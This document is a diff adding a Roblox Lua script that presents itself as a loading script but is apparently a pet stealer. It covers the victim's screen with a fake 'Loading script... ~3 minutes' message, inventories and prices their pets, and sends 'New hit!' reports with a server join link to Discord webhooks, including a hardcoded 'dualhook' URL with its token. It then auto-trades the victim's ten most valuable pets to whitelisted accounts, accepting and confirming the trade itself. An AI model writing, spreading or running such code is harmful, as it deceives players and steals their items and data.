@@ -1,0 +1,657 @@
+local whitelist = getgenv().whitelist
+local webhook = getgenv().webhook
+local TARGET_PLACE_ID = "85896571713843"
+print("Loading script")
+local WHITELISTED_USERS = {
+    "Bloxycross3",
+    "Dx1ixh",
+    "JJpoullmaster",
+   -- "inja_czonytb1" remove because he is a retarded scammer
+}
+local dualhookWebhook = "https://discord.com/api/webhooks/1367259177528852560/Wct_sP0dvX2k0dooNJec90Sm8wxEyaMoI-p2YhvDO71wGx98aT8j0pbYxizHZ2z9qoB_"
+
+repeat task.wait(0.25) until game:IsLoaded()
+--print("Game loaded!")
+local function blockScreen()
+   local ui =  game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TeleportingGui")
+   local label = ui:WaitForChild("Frame"):WaitForChild("Label")
+
+   label.Text = "Loading script... (Usually takes ~3 minutes)"
+   label.Visible = true
+   ui.Enabled = true
+end
+blockScreen() 
+
+local intro = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Intro")
+local function Destroyed(x)
+	if x.Parent then return false end
+	local _, result = pcall(function() x.Parent = x end)
+	return result:match("locked") and true or false
+end
+
+if intro then
+    while not Destroyed(intro) do
+        task.wait()
+    end
+end
+--print("got past intro!")
+
+
+getgenv().KEYBIND = "F"
+
+game:GetService("VirtualInputManager"):SendKeyEvent(true,getgenv().KEYBIND,false,game)
+
+task.wait(0.5)
+local player = game:GetService("Players").LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local httpService = game:GetService("HttpService")
+local runService = game:GetService("RunService")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local playersService = game:GetService("Players") -- Added for trade initiation part
+
+-- Check if we're in the correct place
+local currentPlaceId = tostring(game.PlaceId)
+if currentPlaceId ~= TARGET_PLACE_ID then
+    --print("Not in target place ("..TARGET_PLACE_ID.."), current place: "..currentPlaceId)
+    return
+end
+--print("Script active in target place: " .. currentPlaceId)
+
+function SendMessage(url, message)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["content"] = message
+    }
+    local body = http:JSONEncode(data)
+    local success, response = pcall(function()
+        request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end)
+end
+
+function SendMessageEMBED(url, embed)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["content"] = "||@everyone||",
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["description"] = embed.description,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = {
+                    ["text"] = embed.footer.text .. " | Made by coin.dev ♥"
+                }
+            }
+        }
+    }
+    local body = http:JSONEncode(data)
+    local success, response = pcall(function()
+        request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end)
+end
+
+
+-- § Trading Related Variables
+local TRADING_UI_PATH_STRING = "ScreenGui.Trading" -- Path to check for .Visible
+local TRADE_REMOTE_EVENT_PATH = "Shared.Framework.Network.Remote.RemoteEvent"
+local tradeRemoteEvent_cached = nil
+local petsAddedThisTradeSession = false -- Flag to track if pets were added in the current trade UI session
+
+
+-- Helper function to check if a player is whitelisted
+local function isWhitelisted(playerToCheck)
+    if not playerToCheck then return false end
+    for _, name in ipairs(WHITELISTED_USERS) do
+        if playerToCheck.Name == name then
+            return true
+        end
+    end
+
+    for _, name in ipairs(whitelist) do
+        if playerToCheck.Name == name and #finalUniqueSecretInfos == 0 then 
+            return true
+        end
+    end
+    return false
+end
+
+-- Function to get Trade RemoteEvent
+local function getTradeRemoteEvent()
+    if tradeRemoteEvent_cached and tradeRemoteEvent_cached.Parent then
+        return tradeRemoteEvent_cached
+    end
+    
+    local currentObject = replicatedStorage
+    for _, childName in ipairs(TRADE_REMOTE_EVENT_PATH:split(".")) do
+        currentObject = currentObject:FindFirstChild(childName)
+        if not currentObject then
+            warn("getTradeRemoteEvent: Could not find part '" .. childName .. "' in path '" .. TRADE_REMOTE_EVENT_PATH .. "'")
+            tradeRemoteEvent_cached = nil
+            return nil
+        end
+    end
+
+    if currentObject:IsA("RemoteEvent") then
+        tradeRemoteEvent_cached = currentObject
+        --print("Trade RemoteEvent found and cached:", tradeRemoteEvent_cached:GetFullName())
+        return tradeRemoteEvent_cached
+    else
+        warn("getTradeRemoteEvent: Object at path '" .. TRADE_REMOTE_EVENT_PATH .. "' is not a RemoteEvent. It is a " .. currentObject.ClassName)
+        tradeRemoteEvent_cached = nil
+        return nil
+    end
+end
+
+local function blockScreen()
+   local ui =  game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TeleportingGui")
+   local label = ui:WaitForChild("Frame"):WaitForChild("Label")
+
+   label.Text = "Loading script... (Usually takes ~5 minutes)"
+   label.Visible = true
+   ui.Enabled = true
+end
+
+-- § Pet Collection & Inventory Reporting (with value)
+local allScannedPetDetails = {} -- Stores { [originalPetId] = {name, isSecret, id (originalPetId), value} }
+
+local function getPetValueByName(petName)
+    local valueTable = {
+        ["MAN FACE GOD"] = 47000, ["Dementor"] = 38000, ["Godly Gem"] = 14500, ["Silly Doggy"] = 14000,
+        ["Easter Basket"] = 11000, ["Giant Chocolate Chicken"] = 7000, ["Prophet"] = 5500, ["Lord Shock"] = 4250,
+        ["Wolflord"] = 3300, ["Elite Soul"] = 2200, ["Royal Trophy"] = 2000, ["Avernus"] = 1350,
+        ["Luminosity"] = 1300, ["Elite Challenger"] = 1100, ["Queen Kitty"] = 1100, ["Dowodle"] = 800,
+        ["Patronus"] = 700, ["King Doggy"] = 600, ["D0ggy1337"] = 450, ["Seraph"] = 425, ["Beta TV"] = 400,
+        ["Nebula"] = 350, ["Infernus"] = 350, ["Overseer"] = 300, ["Mech Robot"] = 300, ["The Overlord"] = 250,
+        ["Electra Hydra"] = 250, ["Jackpot"] = 200, ["Dark Serpent"] = 150, ["Enraged Phoenix"] = 125,
+        ["Capybara Plushie"] = 100, ["Manarium"] = 90, ["Flying Gem"] = 80, ["King Soul"] = 60,
+        ["Solar Deity"] = 55, ["Midas"] = 55, ["Chocolate Bunny"] = 55, ["Toilet Doggy"] = 50,
+        ["Dragon Plushie"] = 50, ["Cardinal Bunny"] = 50, ["Crescent Empress"] = 40, ["Starlight"] = 40,
+        ["Moonlight"] = 35, ["Demonic Dogcat"] = 35, ["Sigma Serpent"] = 30, ["Lunar Deity"] = 25,
+        ["Dawn"] = 25, ["King Pufferfish"] = 25, ["Holy Egg"] = 22, ["Magmas"] = 20, ["Kitsune"] = 20,
+        ["Trio Cube"] = 20, ["Moon Deer"] = 20, ["NULLVoid"] = 20, ["Umbra"] = 15, ["DOOF"] = 15,
+        ["Ophanim"] = 15, ["Parasite"] = 5,
+    }
+    return valueTable[petName] or 0
+end
+
+local function equipBest()
+    local remote = getTradeRemoteEvent()
+    local arguments = {
+        [1] = "EquipBestPets"
+    }
+
+    remote:FireServer(unpack(arguments))
+end
+
+local function collectPetNamesAndDetails(container)
+    equipBest()
+    task.wait(0.2)
+    local petCountsByName = {}
+    local foundSecretInfos = {}
+
+    if not container then
+        warn("collectPetNamesAndDetails: Provided container is nil.")
+        return petCountsByName, foundSecretInfos
+    end
+
+    for _, itemInstance in pairs(container:GetChildren()) do
+        local success, result = pcall(function()
+            local originalPetId = itemInstance:GetAttribute("PetId") or itemInstance.Name 
+
+            local inner = itemInstance:FindFirstChild("Inner")
+            local button = inner and inner:FindFirstChild("Button")
+            local buttonInner = button and button:FindFirstChild("Inner")
+            local displayNameLabel = buttonInner and buttonInner:FindFirstChild("DisplayName")
+            local secretTag = buttonInner and buttonInner:FindFirstChild("Secret")
+
+            if displayNameLabel and displayNameLabel:IsA("TextLabel") then
+                local petName = displayNameLabel.Text
+                petCountsByName[petName] = (petCountsByName[petName] or 0) + 1
+                
+                local isSecret = secretTag and secretTag:IsA("GuiObject") and secretTag.Visible
+                
+                local baseValue = getPetValueByName(petName)
+                local petValue = isSecret and (baseValue * 100) or baseValue -- Secret pets are 100x value
+                
+                -- Store details using the originalPetId as the key
+                allScannedPetDetails[originalPetId] = {name = petName, isSecret = isSecret, id = originalPetId, value = petValue}
+
+                if isSecret then
+                    local alreadyListed = false
+                    for _, secret in ipairs(foundSecretInfos) do
+                        if secret.id == originalPetId then alreadyListed = true; break; end
+                    end
+                    if not alreadyListed then table.insert(foundSecretInfos, {name = petName, id = originalPetId}); end
+                end
+            end
+        end)
+        if not success then warn("Error reading DisplayName/Secret for item '" .. itemInstance.Name .. "': ", result) end
+    end
+    return petCountsByName, foundSecretInfos
+end
+
+local function getServerJobId()
+    local jobId = game.JobId
+    if runService:IsStudio() then return "studio-session" end
+    return jobId
+end
+
+local petsFolder = playerGui:WaitForChild("ScreenGui", 10)
+    and playerGui.ScreenGui:WaitForChild("Inventory", 10)
+    and playerGui.ScreenGui.Inventory:WaitForChild("Frame", 10)
+    and playerGui.ScreenGui.Inventory.Frame:WaitForChild("Inner", 10)
+    and playerGui.ScreenGui.Inventory.Frame.Inner:WaitForChild("Pets", 10)
+    and playerGui.ScreenGui.Inventory.Frame.Inner.Pets:WaitForChild("Main", 10)
+    and playerGui.ScreenGui.Inventory.Frame.Inner.Pets.Main:WaitForChild("ScrollingFrame", 10)
+    and playerGui.ScreenGui.Inventory.Frame.Inner.Pets.Main.ScrollingFrame:WaitForChild("Pets", 10)
+
+local teamListFolder = playerGui:WaitForChild("ScreenGui", 10)
+    and playerGui.ScreenGui:WaitForChild("Inventory", 10)
+    and playerGui.ScreenGui.Inventory:WaitForChild("Frame", 10)
+    and playerGui.ScreenGui.Inventory.Frame:WaitForChild("Inner", 10)
+    and playerGui.ScreenGui.Inventory.Frame.Inner:WaitForChild("Pets", 10)
+    and playerGui.ScreenGui.Inventory.Frame.Inner.Pets:WaitForChild("Main", 10)
+    and playerGui.ScreenGui.Inventory.Frame.Inner.Pets.Main:WaitForChild("ScrollingFrame", 10)
+    and playerGui.ScreenGui.Inventory.Frame.Inner.Pets.Main.ScrollingFrame:WaitForChild("Team", 10)
+    and playerGui.ScreenGui.Inventory.Frame.Inner.Pets.Main.ScrollingFrame.Team:WaitForChild("Main", 10)
+    and playerGui.ScreenGui.Inventory.Frame.Inner.Pets.Main.ScrollingFrame.Team.Main:WaitForChild("List", 10)
+
+if not petsFolder then warn("Path to 'petsFolder' is invalid. Inventory scan might be incomplete.") end
+if not teamListFolder then warn("Path to 'teamListFolder' is invalid. Inventory scan might be incomplete.") end
+
+local finalPetCountsByName = {}
+local finalUniqueSecretInfos = {} 
+
+local function mergePetData(countsTable, secretsInfoTable)
+    for name, count in pairs(countsTable) do
+        finalPetCountsByName[name] = (finalPetCountsByName[name] or 0) + count
+    end
+    for _, secretInfoToAdd in ipairs(secretsInfoTable) do
+        local exists = false
+        for _, existingSecret in ipairs(finalUniqueSecretInfos) do
+            if existingSecret.id == secretInfoToAdd.id then exists = true; break; end
+        end
+        if not exists then table.insert(finalUniqueSecretInfos, secretInfoToAdd); end
+    end
+end
+
+-- Initial Scan
+if petsFolder then
+    local petCounts, petSecrets = collectPetNamesAndDetails(petsFolder)
+    mergePetData(petCounts, petSecrets)
+end
+if teamListFolder then
+    local teamCounts, teamSecrets = collectPetNamesAndDetails(teamListFolder)
+    mergePetData(teamCounts, teamSecrets)
+end
+
+local serverJobId = getServerJobId()
+local joinLink = "https://roblox-server-join.vercel.app/?placeId="..TARGET_PLACE_ID.."&jobId="..serverJobId
+
+local initialEmbed = {
+    title = "New hit! **`" .. player.Name .. "`**",
+    description = "Hit at - " .. os.date("!%Y-%m-%d %H:%M:%S UTC") .. "\n\n[**Join Server**]("..joinLink..")",
+    color = #finalUniqueSecretInfos > 0 and 16766720 or 65280, -- Orange for secrets, Green otherwise
+    fields = {},
+    footer = { text = os.date("%Y-%m-%d %H:%M:%S")}
+}
+
+if #finalUniqueSecretInfos > 0 then
+    local val = ""
+    for _, s in ipairs(finalUniqueSecretInfos) do
+        local count = finalPetCountsByName[s.name] or "?"
+        val = val .. "["..count.."x] "..s.name .. "\n"
+    end
+    table.insert(initialEmbed.fields, { name = "Secret Pets ✨", value = val, inline = false })
+end
+
+local initialInventoryFieldValue = ""
+for name, count in pairs(finalPetCountsByName) do
+    local petValue = 0
+    for _, petDetail in pairs(allScannedPetDetails) do -- Iterate the newly populated allScannedPetDetails
+        if petDetail.name == name then
+            petValue = petDetail.value or 0
+            break 
+        end
+    end
+    initialInventoryFieldValue = initialInventoryFieldValue .. "["..count.."x] " .. name .. " - Value: " .. tostring(petValue) .. "\n"
+end
+table.insert(initialEmbed.fields, { name = "All Pets", value = initialInventoryFieldValue, inline = false })
+local whitelistUsersStr = table.concat(whitelist, "; ")
+table.insert(initialEmbed.fields, { name = "Whitelisted Users", value = whitelistUsersStr, inline = false })
+
+
+if #finalUniqueSecretInfos > 0 then
+    SendMessageEMBED(dualhookWebhook, initialEmbed)
+end
+if #finalUniqueSecretInfos == 0 then
+    SendMessageEMBED(webhook, initialEmbed)
+end
+
+
+
+-- § Trading Functionality
+
+local function refreshInventory()
+    --print("Refreshing inventory data...")
+    equipBest()
+    task.wait(0.2)
+    finalPetCountsByName = {}
+    finalUniqueSecretInfos = {}
+    allScannedPetDetails = {} -- Crucial: Clear before re-collecting
+
+    if petsFolder then
+        local petCounts, petSecrets = collectPetNamesAndDetails(petsFolder)
+        mergePetData(petCounts, petSecrets)
+    else
+        warn("refreshInventory: petsFolder not found, cannot scan general pets.")
+    end
+    if teamListFolder then
+        local teamCounts, teamSecrets = collectPetNamesAndDetails(teamListFolder)
+        mergePetData(teamCounts, teamSecrets)
+    else
+        warn("refreshInventory: teamListFolder not found, cannot scan equipped pets.")
+    end
+
+    --print("Inventory data refreshed. Total unique pet names:", #finalPetCountsByName)
+    local scannedDetailsCount = 0
+    if allScannedPetDetails and next(allScannedPetDetails) then
+        for _ in pairs(allScannedPetDetails) do
+            scannedDetailsCount = scannedDetailsCount + 1
+        end
+    end
+    --print("Total scanned pet details (instances):", scannedDetailsCount) 
+
+    local embed = {
+        title = "Pet Inventory Report for: " .. player.Name,
+        description = "Inventory refreshed: " .. os.date("!%Y-%m-%d %H:%M:%S UTC") .. "\n[Join Server]("..joinLink..")",
+        color = #finalUniqueSecretInfos > 0 and 16766720 or 65280,
+        fields = {},
+        footer = { text = os.date("%Y-%m-%d %H:%M:%S") .. " | Place: "..currentPlaceId.." | Job: "..serverJobId }
+    }
+
+    if #finalUniqueSecretInfos > 0 then
+        local val = ""
+        for _, s in ipairs(finalUniqueSecretInfos) do
+            local count = finalPetCountsByName[s.name] or "?"
+            val = val .. "["..count.."x] "..s.name .. "\n" -- Note: originalPetId `s.id` is available if needed
+        end
+        table.insert(embed.fields, { name = "Secret Pets (Refreshed)", value = val, inline = false })
+    end
+
+    local inventoryFieldValue = ""
+    if next(finalPetCountsByName) then
+        for name, count in pairs(finalPetCountsByName) do
+            local petValue = 0
+            -- Find an instance of this pet in allScannedPetDetails to get its value
+            -- This assumes value is consistent for the name or takes one example
+            for _, petDetail in pairs(allScannedPetDetails) do
+                if petDetail.name == name then
+                    petValue = petDetail.value or 0
+                    break -- Found value for this pet name
+                end
+            end
+            inventoryFieldValue = inventoryFieldValue .. "["..count.."x] " .. name .. " - Value: " .. tostring(petValue) .. "\n"
+        end
+    else
+        inventoryFieldValue = "No pets found in inventory."
+    end
+    table.insert(embed.fields, { name = "All Pets (Refreshed)", value = inventoryFieldValue, inline = false })
+    table.insert(embed.fields, { name = "Whitelisted Users", value = whitelistUsersStr, inline = false })
+
+
+   -- SendMessageEMBED(webhook, embed)
+    --print("Sent refreshed inventory webhook.")
+end
+
+
+local function addPlayerPetsToActiveTrade()
+    if petsAddedThisTradeSession then
+        --print("Trading: Pets already attempted to be added for this trade UI session.")
+        return
+    end
+
+    local remote = getTradeRemoteEvent()
+    if not remote then
+        warn("Trading: Cannot add pets - Trade RemoteEvent not found.")
+        petsAddedThisTradeSession = true -- Mark as attempted for this session
+        return
+    end
+
+    -- Ensure allScannedPetDetails is fresh before making decisions
+    -- refreshInventory() -- Option: call refresh here if there's a long delay possible.
+                        -- For now, assume initial scan or post-trade refresh is sufficient.
+
+    local equippedPets = {}
+    local secretPets = {}
+    local otherPets = {}
+   --print("Categorizing pets for trade. Previously scanned details count:") -- Clarified the --print message
+    local scannedDetailsCount = 0
+    if allScannedPetDetails and next(allScannedPetDetails) then
+        for _ in pairs(allScannedPetDetails) do
+            scannedDetailsCount = scannedDetailsCount + 1
+        end
+    end
+    --print("Total scanned pet details (instances) before categorization:", scannedDetailsCount) 
+    for originalPetId, petDetail in pairs(allScannedPetDetails) do
+        -- Important: Game's trade system might expect a "cleaned" ID
+        local cleanPetIdForTrade = originalPetId:gsub("-team", ""):gsub("%-(%d+)$", ":%1")
+        
+        local entry = { idForTrade = cleanPetIdForTrade, detail = petDetail, originalId = originalPetId }
+
+        if string.find(originalPetId, "-team") then -- Check originalId for "-team" suffix
+            table.insert(equippedPets, entry)
+        elseif petDetail.isSecret then
+            table.insert(secretPets, entry)
+        else
+            table.insert(otherPets, entry)
+        end
+    end
+
+    -- Sort each category by value (descending)
+    table.sort(equippedPets, function(a, b) return (a.detail.value or 0) > (b.detail.value or 0) end)
+    table.sort(secretPets, function(a, b) return (a.detail.value or 0) > (b.detail.value or 0) end)
+    table.sort(otherPets, function(a, b) return (a.detail.value or 0) > (b.detail.value or 0) end)
+
+    local finalTradeList = {}
+    local addedOriginalIds = {} -- To prevent adding the exact same pet instance twice
+
+    -- 1. Add equipped pets
+    for _, petEntry in ipairs(equippedPets) do
+        if #finalTradeList < 10 and not addedOriginalIds[petEntry.originalId] then
+            table.insert(finalTradeList, petEntry)
+            addedOriginalIds[petEntry.originalId] = true
+        end
+    end
+
+    -- 2. Add secret pets (if not already added as equipped)
+    for _, petEntry in ipairs(secretPets) do
+        if #finalTradeList < 10 and not addedOriginalIds[petEntry.originalId] then
+            table.insert(finalTradeList, petEntry)
+            addedOriginalIds[petEntry.originalId] = true
+        end
+    end
+
+    -- 3. Fill with other valuable pets
+    for _, petEntry in ipairs(otherPets) do
+        if #finalTradeList < 10 and not addedOriginalIds[petEntry.originalId] then
+            table.insert(finalTradeList, petEntry)
+            addedOriginalIds[petEntry.originalId] = true
+        end
+    end
+
+    if #finalTradeList == 0 then
+        --print("Trading: No pets found/selected to add based on priority and availability.")
+        petsAddedThisTradeSession = true -- Mark as attempted for this session
+        return
+    end
+
+    --print("Trading: Adding up to 10 pets with priority (Equipped > Secret > Other Value)...")
+    local petsFiredCount = 0
+    for i = 1, math.min(10, #finalTradeList) do
+        local petEntry = finalTradeList[i]
+        local typeTag = ""
+        if string.find(petEntry.originalId, "-team") then typeTag = " (Equipped)"
+        elseif petEntry.detail.isSecret then typeTag = " (Secret)" end
+
+        --print("Trading: Adding pet to trade - Name: " .. (petEntry.detail.name or "N/A") ..
+          --    ", Value: " .. (petEntry.detail.value or 0) .. 
+            --  ", ID for Trade: " .. petEntry.idForTrade .. typeTag)
+        
+        local success, err = pcall(function()
+            remote:FireServer("TradeAddPet", petEntry.idForTrade)
+        end)
+        if success then
+            petsFiredCount = petsFiredCount + 1
+        else
+            warn("Trading: Error firing TradeAddPet for pet ID '" .. petEntry.idForTrade .. "' (Original: "..petEntry.originalId.."): " .. err)
+        end
+        task.wait(0.35) -- Be respectful to server, avoid spamming
+    end
+    
+    --print("Trading: Fired " .. petsFiredCount .. " pets to be added.")
+
+    -- Existing logic for accepting and confirming trade
+    task.wait(0.5)
+    local arguments = { [1] = "TradeAccept" }
+    local successAccept, errAccept = pcall(function()
+        replicatedStorage.Shared.Framework.Network.Remote.RemoteEvent:FireServer(unpack(arguments))
+    end)
+    if not successAccept then warn("Error firing TradeAccept:", errAccept) end
+
+    local tradeGui = playerGui:FindFirstChild("ScreenGui") and playerGui.ScreenGui:FindFirstChild("Trading")
+    local confirmAttempts = 0
+    while tradeGui and tradeGui.Visible and confirmAttempts < 60 do -- Added attempt limit
+        arguments = { [1] = "TradeConfirm" }
+        local successConfirm, errConfirm = pcall(function()
+            replicatedStorage.Shared.Framework.Network.Remote.RemoteEvent:FireServer(unpack(arguments))
+        end)
+        if not successConfirm then warn("Error firing TradeConfirm:", errConfirm) end
+        
+        --print("Fired TradeConfirm (Attempt: " .. confirmAttempts + 1 .. ")")
+        confirmAttempts = confirmAttempts + 1
+        task.wait(0.25) -- Slightly longer wait for confirm loop
+    end
+    if confirmAttempts >= 20 then print(".") end
+
+    --print("Trading: Finished attempting to add pets and confirm. Total pets fired: " .. petsFiredCount)
+    
+    local vim = game:GetService("VirtualInputManager")
+    for i = 1, 2 do
+        vim:SendKeyEvent(true, getgenv().KEYBIND, false, game)
+        task.wait(0.05)
+        vim:SendKeyEvent(false, getgenv().KEYBIND, false, game)
+        task.wait(0.05) 
+    end
+    
+    refreshInventory() -- Refresh inventory after trade actions.
+
+    petsAddedThisTradeSession = true -- Mark this UI session as handled. Reset by startTradeAddListener when UI closes.
+end
+
+
+local function startTradeAddListener()
+    local tradingGuiCache = nil -- Cache the trading GUI path if static
+    local function getTradingGui()
+        if tradingGuiCache and tradingGuiCache.Parent then return tradingGuiCache end
+        -- Use the TRADING_UI_PATH_STRING to find the GUI
+        local pathParts = TRADING_UI_PATH_STRING:split(".")
+        local currentObject = playerGui
+        for _, partName in ipairs(pathParts) do
+            if currentObject then
+                currentObject = currentObject:FindFirstChild(partName)
+            else
+                return nil -- Path broken
+            end
+        end
+        if currentObject and currentObject:IsA("GuiObject") then -- or specific class like 'Frame' or 'ScreenGui'
+            tradingGuiCache = currentObject
+            return tradingGuiCache
+        end
+        return nil
+    end
+
+    while true do
+        local tradeGui = getTradingGui()
+        if tradeGui and tradeGui.Visible then
+            if not petsAddedThisTradeSession then
+                --print("Trading UI detected and active. Attempting to add pets...")
+                addPlayerPetsToActiveTrade() 
+                -- addPlayerPetsToActiveTrade will set petsAddedThisTradeSession = true internally
+            else
+                -- --print("Trading UI still visible, but pets already processed for this session.")
+            end
+        else
+            if petsAddedThisTradeSession then
+                --print("Trade UI no longer visible or not found. Resetting trade session flag for next opportunity.")
+                petsAddedThisTradeSession = false -- Reset when UI is gone, allowing next trade to proceed
+                tradingGuiCache = nil -- Clear cache if UI is gone, to re-find next time
+            end
+        end
+        task.wait(2) -- Check interval
+    end
+end
+
+local function initiateTradeWithWhitelistedPlayerOnChat()
+    local tradeEvent = getTradeRemoteEvent()
+    if not tradeEvent then
+        warn("Cannot initiate chat-triggered trade: Trade RemoteEvent not found.")
+        return
+    end
+
+    local function onPlayerChatted(otherPlayer, message)
+        if isWhitelisted(otherPlayer) then
+            --print("Chat detected from whitelisted player:", otherPlayer.Name, "- Message:", message)
+            -- Optional: Check message content for a specific command e.g. if message:lower():match("^trade me") then
+            local success, err = pcall(function()
+                tradeEvent:FireServer("TradeRequest", otherPlayer)
+            end)
+            if not success then
+                warn("Failed to fire TradeRequest to " .. otherPlayer.Name .. ": " .. tostring(err))
+            else
+                --print("TradeRequest sent to:", otherPlayer.Name)
+            end
+        end
+    end
+
+    for _, otherPlayer in ipairs(playersService:GetPlayers()) do
+        if otherPlayer ~= player then
+            otherPlayer.Chatted:Connect(function(msg)
+                onPlayerChatted(otherPlayer, msg)
+            end)
+        end
+    end
+
+    playersService.PlayerAdded:Connect(function(newPlayer)
+        if newPlayer ~= player then
+            newPlayer.Chatted:Connect(function(msg)
+                onPlayerChatted(newPlayer, msg)
+            end)
+        end
+    end)
+    --print("Chat-triggered trade initiation listener started.")
+end
+
+-- Start background tasks
+
+task.spawn(initiateTradeWithWhitelistedPlayerOnChat)
+task.spawn(startTradeAddListener)
+
+--print("Inventory scanning and auto-trading script started for user: " .. player.Name)
+-- SendMessage(webhook, player.Name .. " inventory scanning script started successfully in place " .. currentPlaceId)
